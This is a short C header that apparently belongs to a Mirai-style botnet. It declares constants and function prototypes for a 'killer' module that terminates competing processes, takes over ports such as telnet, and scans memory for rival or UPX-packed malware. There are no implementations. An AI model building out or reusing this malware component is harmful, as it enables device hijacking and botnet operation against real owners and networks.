#pragma once

#include "includes.h"

#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 600

#define KILLER_REBIND_TELNET
#define upx_scan_match


void portkiller_init(void);
void port_killer_kill(void);
void killer_init(void);
void killer_kill(void);
BOOL killer_kill_by_port(port_t);

static BOOL has_exe_access(void);
static BOOL memory_scan_match(char *);
static BOOL status_upx_check(char *, char *);
static BOOL mem_exists(char *, int, char *, int);
